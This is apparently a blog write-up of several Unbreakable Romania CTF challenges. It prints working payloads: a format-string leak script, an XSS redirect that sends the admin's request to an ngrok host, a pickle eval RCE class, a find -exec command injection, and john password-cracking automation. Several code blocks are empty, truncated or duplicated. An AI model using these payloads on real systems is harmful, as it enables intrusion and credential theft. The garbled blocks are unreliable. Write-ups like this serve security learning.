## better-cat {#better-cat}
{% highlight bash %}
You might need to look for a certain password.

Flag format: ctf{sha256}

Goal: In this challenge you have to obtain the password string or flag from the binary file.

The challenge was created by Bit Sentinel.
{% endhighlight %}

As the title hints, the solution involved using the 'strings' program on the given binary:

{% highlight bash %}

The `-7` switch tells the strings program to only print words longer than 7 characters. Also, `| head -n 24` just limits the amount of results that are printed on the screen(in this case, 24). 

I could see parts of the flag, but I didn't want to manually concatenate them. I remembered the executable asked for a password, so I ran it again and used 'parola12', which I also found in the program's strings (the word 'parola' means 'password'):

{% highlight bash %}

## notafuzz {#notafuzz}
{%highlight bash %}
To fuzz or nor?

Flag format: ctf{sha256}

Goal: You have to connect to the service using telnet/netcat and find a way to recover the flag by abusing a common techniques used in the exploitation of binaries.

The challenge was created by Bit Sentinel.
{% endhighlight %}

The players were also given an executable named 'chall' and a address that was supposedly running the challenge on a server. The binary simply asked if I had 'control':

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/notafuzz$ ./chall 
Good luck!

yes
yes
It does not look like. You have the alt!
Do you have the control?
^C
yakuhito@furry-catstation:~/ctf/unbr1/notafuzz$
{% endhighlight %}

I tried to overflow the buffer, but the binary wasn't vulnerable. I also tried a format string attack, but that didn't work either. To solve this challenge, I needed to open the program in IDA. The following image contains a part of the reassembled 'main' function:

<div>
<center><img src="/images/unbreakable_1_writeup/notafuzz-ida.png"></center>
</div>

I only tried the format string attack the first time I was asked for input! Knowing that the third answer will use `printf` with my input as the first argument, it was trivial to leak bytes from the program's memory:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/notafuzz$ ./chall 
Good luck!

yakuhito@furry-catstation:~/ctf/unbr1/notafuzz$
{% endhighlight %}

I used the folowing python script to exploit the format string vulnerability on the remote machine:

{% highlight python %}
from pwn import *

context.log_level = "CRITICAL"

def leakAddr(memOffset):
	r = remote('35.246.180.101', 31425)
	r.recvuntil('Do you have the control?')
	r.sendline('yaku')
	r.recvuntil('Do you have the control?')
	r.sendline('yaku')
	r.recvuntil('Do you have the control?\r\n')
	r.sendline(' | %' + str(memOffset) + '$p | ')
	resp = r.recvuntil('Do you have the control?')
	r.close()
	return resp.decode().split(' | ')[3]

for i in range(1000):
	print(str(i) + " " + leakAddr(i))
{% endhighlight %}

I didn't know exactly where the flag was located, so I waited for the script to print some hex values that might decode to valid ASCII characters.

{% highlight bash %}

Offsets 136-153 seemed promising, so I decoded them and got a string that resembled the flag:

{% highlight bash %}

I'm still not sure what the role of those 'X' characters is, but removing them from the string produced the valid flag.

**Flag:** ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}

## manual-review {#manual-review}

{% highlight bash %}
For any coffe machine issue please open a ticket at the IT support department.

Flag format: ctf{sha256}

Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.

The challenge was created by Bit Sentinel.
{% endhighlight %}

A web challenge! As always, it turned out I overcomplicated things. After making an account, I had the option of sending messages to admins:

<div>
<center><img src="/images/unbreakable_1_writeup/manual-review-dashboard.png"></center>
</div>

Everything hinted at an XSS, so I entered `<script>alert(1);</script>` and clicked the submit button. As expected, the javascript code was executed.

This was the part where I got stuck. I managed to exfiltrate data from the admin's browser, but I couldn't get the flag. The flag, as it turned out, was in the `User-Agent` header. My final payload:

{% highlight javascript %}
<script>
window.location.href = "https://361c4f4977c5.ngrok.io/yaku";
</script>
{% endhighlight %}

The request from the admin's browser looked like this:
{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/manual-review$ nc -nvlp 1337

## rundown {#rundown}
{% highlight bash %}
A rundown, informally known as a pickle or the hotbox, is a situation in the game of baseball that occurs when the baserunner is stranded between two bases, also known as no-man's land, and is in jeopardy of being tagged out." ... if you stopped in the first part of the definition you are one of ours.

Flag format: ctf{sha256} Goal: You have to discover a vulnerability in this simple web application and recover the flag.

The challenge was created by Bit Sentinel.
{% endhighlight %}

A great web challenge. Acessing the site with my browser only returned `APIv2 @ 2020 - You think you got methods for this?`, so I tried making a POST request with curl, saving the output to a file, and opening that file with my browser:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/rundown$ curl -X POST http://35.246.180.101:30994/ > a.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

{% endhighlight %}

<div>
<center><img src="/images/unbreakable_1_writeup/rundown-error.png"></center>
</div>

The new output offered a lot of information. First, the web app was powered by Flask. The server was using python 2.7 and a part of the app.py file was visible in the traceback:

{% highlight python %}
@app.route("/", methods=["POST"])

def newpost():
  picklestr = base64.urlsafe_b64decode(request.data)

  if " " in picklestr:
    return "The ' ' is blacklisted!"

  postObj = cPickle.loads(picklestr)
  return ""

if __name__ == "__main__":
    app.run(host = "0.0.0.0", debug=True)
{% endhighlight %}

[Using pickle on user input is as secure as using eval](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). However, I was not allowed to use spaces in the payload, so the task was a bit harder. The solve script below prints the flag, but I have to admit it was inspired [from this writeup](https://github.com/saw-your-packet/ctfs/blob/master/Unbreakable%20Romania%20Online%20%231/Write-ups.md#rundown):

{% highlight python %}
import _pickle as cPickle
import base64
import os
import string
import requests
import time

class Exploit(object):
	def __reduce__(self):
		return (eval, ('eval(open("flag","r").read())', ))

def sendPayload(p):
	newp = base64.urlsafe_b64encode(p).decode()
	headers = {'Content-Type': 'application/yakoo'}
	r = requests.post("http://35.246.180.101:30994/",headers=headers,data=newp)
	return r.text


payload_dec = cPickle.dumps(Exploit(), protocol=2)
print("ctf{" + sendPayload(payload_dec).split("ctf{")[1].split("}")[0] + "}")
{% endhighlight %}

My solution involved exfiltrating the flag character by character by raising an eception if the characters don't match - like a blind SQL injection, but with pickle & python. To get an idea of how overcomplicated it was, here's my original `Exploit` class:

{% highlight python %}
class Exploit(object):
	def throw_err(e):
		raise Exception(e)

	def __reduce__(self):
		return (eval, ('(0)if(open("flag","r").read()[77]=="z")else(1/0)', ))
{% endhighlight %}

**Flag:** ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}

## the-code {#the-code}
{% highlight bash %}
Look, the code is there. Enjoy.

Flag format: ctf{sha256}

Goal: You receive the source code of a small web application and you have to find the vulnerability to exfiltrate the flag.

The challenge was created by Bit Sentinel.
{% endhighlight %}

After the competition ended, I found out the reason the number of solves was so high for this challenge: the flag could be obtained by simply acessing `/flag`. Since I solved this challenge the intended way, let's suppose you don't know about the file mentioned above. Here's the source code of the `index.php` file:

{% highlight php %}
 <?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

if(stristr($_GET['arg'], 'php')){
    echo "nope!";
    exit;
}

if(stristr($_GET['arg'], '>')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], '$')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], '&')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], ':')){
    echo "Not needed!";
    exit;
}

echo strtoupper(base64_encode(shell_exec("find /tmp -iname ".escapeshellcmd($_GET['arg']))));

// Do not even think to add files.
{% endhighlight %}

The vulnerability was pretty easy to spot: the script uses `escapeshellcmd` whereas it should be using `escapeshellarg`. While I couldn't directly execute other programs, I could pass other switches and arguments to `find`. Having used this program a lot, I already knew it had an `-exec` switch. Here's the manpage in case you don't know what it does already:

{% highlight bash %}
       -exec command ;
              Execute command; true if 0 status is returned.  All following arguments to find are taken to be arguments to the command until an argument consisting of `;' is encountered.  The string
              `{}' is replaced by the current file name being processed everywhere it occurs in the arguments to the command, not just in arguments where it is alone, as in some  versions  of  find.
              Both  of these constructions might need to be escaped (with a `\') or quoted to protect them from expansion by the shell.  See the EXAMPLES section for examples of the use of the -exec
              option.  The specified command is run once for each matched file.  The command is executed in the starting directory.   There are unavoidable security problems surrounding use  of  the
              -exec action; you should use the -execdir option instead.
{% endhighlight %}

Basically, passing `*%20-exec%20cat%20flag%20;` (urldecoded: `* -exec cat flag ;`) to `arg` will output the flag a few times:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/the-code$ curl "http://35.242.239.180:30233/?start=1&arg=*%20-exec%20cat%20flag%20;"
Y3RME2FHZJE1Y2FJZMJHNJE1ZDUXMZCYMZG2OTA5YZQ3NZFMMDGZNJI4NGFKMWE1MZLIY2VMNDKYMDFJNJYWNJMXZWR9Y3RME2FHZJE1Y2FJZMJHNJE1ZDUXMZCYMZG2OTA5YZQ3NZFMMDGZNJI4NGFKMWE1MZLIY2VMNDKYMDFJNJYWNJMXZWR9
{% endhighlight %}

The problem, however, was that the output is encoded to base64 and then passed to `strtoupper`. I made the following script that attempts to decode the uppercase base64 string:

{% highlight python %}
import base64
import sys
import string

def lower(enc_st, i):
	return enc_st[:i] + enc_st[i].lower() + enc_st[i + 1:]

def score(s, posmax):
	score = 0
	alphabet = string.printable[:-2].encode()
	dec = base64.b64decode(s)
	if dec[0] not in alphabet:
		return -1
	while score < (posmax * 6 // 8 + 6) and dec[score] in alphabet:
		score += 1
	return  score - 1


def tryToLower(enc_st, pos):
	encs = []
	scores = []
	for i in range(256):
		enc = enc_st
		b = bin(i)[2:]
		if len(b) < 8:
			b = "0" * (8 - len(b)) + b
		for offset, shouldLower in enumerate(b):
			if shouldLower == "1":
				enc = lower(enc, pos + offset)
		encs.append(enc)
		scores.append(score(enc, pos))
	max = -1
	posmax = -1
	for i, s in enumerate(scores):
		if s > max:
			max = s
			posmax = i
	arr = []
	verif = []
	for i, s in enumerate(scores):
		if s == max and encs[i] not in verif:
			verif.append(encs[i])
			arr.append(i)
	if len(arr) == 1:
		return encs[posmax]
	else:
		print("CHOICE TIME")
		for i in arr:
			print(str(i).encode() + b'. ' + base64.b64decode(encs[i]))
		x = input()
		return encs[int(x)]


enc = sys.argv[1]
for i in range(0, len(enc), 8):
	enc = tryToLower(enc, i)

print(base64.b64decode(enc))
{% endhighlight %}

Each time the program asks you to choose between some strings, choose the one that starts with the longest valid string (keep in mind that the only allowed characters between `ctf{` and `}` are `0-9a-f`)

**Flag:** ctf{aaf15cacfba615d51372386909c4771f0836284ad1a539bcef49201c660631ed}

{% endhighlight %}

`socat` - the CTF player's worst nightmare. There was no attached file, so I connected to the specified host with `nc` and played with the input until the program crashed:

{% highlight bash %}
yakuhito@furry-catstation:~/ctf/unbr1/imagine-that$ nc 35.242.239.180 30622

^C
yakuhito@furry-catstation:~/ctf/unbr1/imagine-that$ 
{% endhighlight %}

The error suggested that the program was asking for a range. Entering `1` and `100` would print `You can not read more then 10.`, so I entered `1` and `10` and got the following output (non-ASCII characters replaced with X for convenience):

{% highlight bash %}

The output looked like a png header, so I made the assumption that the program prints the bytes of an image file at offsetd `start..end`, where `start` and `end` represent the numbers entered by the user. Before showing you the script, there's 2 things you need to know abou socat:
* in this case, it appended '\x89' before the bytes in the file
* it tranforms '\n' to '\r\n'

The '\x89' byte is, however, the start of the PNG file signature, so my script had to add it automatically at the start of the file:

{% highlight python %}
from pwn import *

context.log_level = "CRITICAL"

host, port = ("34.89.159.150", 32353)

def get_bytes(start):
	end = start + 1
	r = remote(host,port)
	r.recvuntil(": ")
	r.sendline(str(start).encode())
	r.recvuntil(": ")
	r.sendline(str(end).encode())
	r.recvuntil(str(end).encode() + b'\r\n')
	file = r.recvuntil("Enter")
	r.close()
	file = file[1:-7]
	if len(file) == 1:
		return file
	else:
		if file == b'\r\n':
			return b'\n'
		else:
			print('You can stop the program now')
			return b'\x00'


p = 0
f = open("saveme", "wb")
f.write(b'\x89')
while True:
	new_bytes = get_bytes(p + 1, p + 2)
	f.write(new_bytes)
	f.flush()
	p = p + 1 #len(new_bytes)
	print(new_bytes)

f.close()
{% endhighlight %}

After about 5-10 minutes, the program extracted an image that contained a QR code. The QR code decoded to `asdsdgbrtvt4f5678k7v21ecxdzu7ib6453b3i76m65n4bvcx`, which is the password that unlocks the flag:

The hex string entered is different for 2 different inputs, but it does not change from session to session if the word entered remains the same. It's also 138 characters long, which is exactly the length the flag would have if viewed as hex. These facts led me to test another string:

The first 8 bytes were 0, which meant that the program was somehow comparing the string entered with the actual flag. The operation could be a simple substraction, a XOR, or a very complicated algorithm, but the important thing was that the first `2*n` nibbles would be equal to '0' only if the flag starts with the first `n` characters of the input. With that information in mind, I wrote the following program to get the flag character by character:

{% highlight python %}
from pwn import *

context.log_level = "critical"

def tryFlagPart(flag_part):
	r = remote('34.89.159.150', 32653)
	r.recvuntil(": ")
	r.sendline(flag_part)
	r.recvuntil(flag_part + "\r\n")
	resp = r.recvuntil("\r\n")[:-2]
	r.close()
	return resp.decode().startswith('0' * 2 * len(flag_part))

alphabet = "0123456789abcdef}"
flag = "ctf{"

while flag[-1] != "}":
	for c in alphabet:
		if tryFlagPart(flag + c):
			flag += c
			print(flag)
			break

The given pcap contained a lot of UDP packets. However, there were only 138 TCP packets, which was precisely the number of nibbles required to write a flag in hexadecimal. The solution involved treating each destination port as a nibble. Thankfully, `tshark` could extract all the port numbers without much effort on my part:

For this particular challenge, there's no point of walking you step by step through my solving process, so here's a summary:
   * Unzipping a file resulted in another archive, eventually leading to the flag. Presumably, the number of steps is too big for the challenge to be completed manually.
   * There were 3 different type of archives
   * `.gz` archives could simply be extracted by using gunzip (no password required)
   * `.zip` archives required a password to be unzipped. The password was different every time, but it was included in `john`'s default dictionary.
   * `.7z` archives also required a password to be extracted. This time, however, the password wasn't included in the default dictionary, so I had to use `rockyou.txt`.

That being said, here's my solve script:
{% highlight python %}
import os
import subprocess

os.system("cp jibeqnocfjjuijypians.original archive")

def run_cmd(cmd):
	arr = cmd.split(" ")
	return subprocess.run(arr, stdout=subprocess.PIPE).stdout.decode()

def gunzip():
	os.system("mv archive archive.gz")
	os.system("gunzip archive.gz")

def zip():
	os.system("mv archive archive.zip")
	os.system("/home/yakuhito/ctf/dawgctf2020/JohnTheRipper/run/zip2john archive.zip > crackme")
	os.system("john crackme > /dev/null")
	psw = run_cmd("john crackme --show")
	psw = psw.split(":")[1]
	os.system("unzip -P '" + psw + "' archive.zip")
	os.system("rm archive.zip")
	os.system("mv archives/* archive")
	os.system("rm -r archives")

def sevenz():
	os.system("mv archive archive.7z")
	os.system("/pentest/password-recovery/johntheripper/7z2john.pl archive.7z > crackme")
	os.system("john crackme --wordlist=/pentest/rockyou.txt")
	psw = run_cmd("john crackme --show")
	psw = psw.split(":")[1].split("\n")[0]
	os.system("7z e archive.7z -P'" + psw + "'")
	files = run_cmd("ls -l")
	files = [_.split(" ")[-1] for _ in files.split("\n")[1:-1]]
	file = ""
	for f in files:
		if f not in ['archive.7z', 'crackme', 'jibeqnocfjjuijypians.original', 'solve.py', '']:
			file = f
			break
	os.system("rm archive.7z")
	os.system("mv " + f + " archive")

def round():
	cont = True
	f = run_cmd("file archive")
	if 'gzip' in f:
		gunzip()
	elif 'Zip archive' in f:
		zip()
	elif '7-zip' in f:
		sevenz()
	else:
		print('Done')
		cont = False
	return cont

run = True
while run:
	run = round()
{% endhighlight %}

When the program above finished its execution, the flag could be found in the `archive` file.

{% endhighlight %}

Before discussing the solution, I have to mention [this great article](https://book.hacktricks.xyz/forensics/volatility-examples). It basically contains all the commands someone would need to start using `volatility`.

That being said, my solution had nothing to do with volatility in the end. I just extracted the strings of the given memory dump (using `strings`, as well as `strings -e l` and `strings -e b`), opened the resulting file in sublime and started searching for the password.

After several hours of searching (and about one hour spent using `volatility`), I had a pretty good idea of what happened on the victim's computer. Basically, the victim logged in on gmail and then downloaded a malicious file (`ire.dmp.2032.rar.txt.pdf`).

There were 2 likely locations for the passwords:
  * The malicious program's memory, if the image was taken while the program was being executes (this wasn't the case)
  * Chrome's memory, because the user logged in using Chrome.

I tried to sign in on Chrome on my own machine and took note of different kinds of information about the page, such as text, url, and the password input's id. Searching the file for the latter revealed the victim's password: `passwordflagwin`. The flag is `ctf{sha256('passwordflagwin')}`

So, to sum this challenge up: `strings e.bin | grep password | grep flag`

**Flag:** ctf{2e6a00f7b0294b50821eb5f61c5d64e3916227bfe89ed0397d797978fe44abe2}

He was called to offer his expertise on the last tsunami which took place in our country.

While Steve was working, a mysterious package arrived at the door.

Inside, an USB stick was found, containing the following audio file: rain.wav

After trying several steganography programs, the solution turned out to be quite simple. I opened the `rain.wav` file in Audacity and changed the view mode to 'Spectrogram'. I then opened the `Spectrogram Settings` menu and tried several numbers for `window size`, eventually setting it to `4096`. After zooming in a little bit, this is what the spectrogram looked like:

<div>
<center><img src="/images/unbreakable_1_writeup/spectrogram.png"></center>
</div>

In case you can't see it, the graph reads 'Secret Code: spectrogram'. The flag is `ctf{sha256('spectrogram')}`.

{% endhighlight %}

To retrieve the flag, I needed to reverse all 4 `enc` functions. Don't worry, though - it's not as complicated as you think.

The first function, `enc1`, takes a `key` of type int and arranges the characters of `msg` in a matrix, calculating the `cipher` variable by reading that matrix row by row instead of column by column. Truth is, you don't need to know all of this. The only important information is that the function scrambles the characters of `msg` in some way. A clever way to reverse it is to call `enc1` with a `msg` equal to `'\x00\x01\x02...'` and to use the resulting scrambled string to decrypt the real message. As the `enc1` function does not take the characters of `msg` into consideration when scrambling them, the resulting permutation will be the same for all strings of the same length.

{% highlight python %}
def dec1(msg, key): 
    hack = [chr(_) for _ in range(len(msg))]
    hack = enc1(hack, key)
    dec = ['' for i in range(len(msg))]
    for i, v in enumerate(hack):
    	pos = ord(v)
    	dec[pos] = msg[i]
    return ''.join(dec).rstrip('z')
{% endhighlight %}

The `enc1` function also pads `msg` with `'z'` characters at the end, so the decryption function should strip them away. The `dec2` function is just a pretty Caesar cipher implementation:

{% highlight python %} 
def enc2(string, key): 
    for c in string:
        o = ord(c)
        if (o not in upper and o not in lower) or o in digit:
            yield o
        else:
            if o in upper and o + key % 26 in upper:
                yield o + key % 26
            elif o in lower and o + key % 26 in lower:
                yield o + key % 26
            else: 
                yield o + key % 26 -26
{% endhighlight %}

To obtain the decrypted string, we should just call the encrypt function again, this time with a key of `26 - (key % 26)`:

{% highlight python %}
def dec2(string, key):
	return enc2(string, 26 - (key % 26))
{% endhighlight %}

I will now skip to `enc4`, because `enc3` is a bit trickier than the rest and needs more explaination:

{% highlight python %}
def enc4(text, key, debug=False):

As you can see above, `enc4` is just an implementation of the [Rail fence cipher](https://en.wikipedia.org/wiki/Rail_fence_cipher). I could write a decryption function for railfence, or I could use the fact that this function also generates a permutation of the plaintext characters that is based only on the length of the plaintext and the key. That being said, the `dec4` function is almost identical to `dec1`:

{% highlight python %}
def dec4(text, key, debug=False):
	text = list(text)
	dec = [0 for _ in range(len(text))]
	hack = ''.join([chr(11 + i) for i in range(len(text))]) # \n is 10 and gets ignored
	hack = enc4(hack, key)
	for i, v in enumerate(hack):
		pos = ord(v) - 11
		dec[pos] = text[i]
	return ''.join(dec)
{% endhighlight %}

The major difference is that instead of calling `enc4` with `text='\x00\x01...'`, I call it with `text='\x11\x12...'`. I do this because the `enc4` function strips all `'\x10'='\n'` characters.

{% highlight python %}
def dec4(text, key, debug=False):
	text = list(text)
	dec = [0 for _ in range(len(text))]
	hack = ''.join([chr(11 + i) for i in range(len(text))]) # \n is 10 and gets ignored
	hack = enc4(hack, key)
	for i, v in enumerate(hack):
		pos = ord(v) - 11
		dec[pos] = text[i]
	return ''.join(dec)
{% endhighlight %}

I do share the same beliefs as the author's father, but, unlike him, I use secure encryption methods.
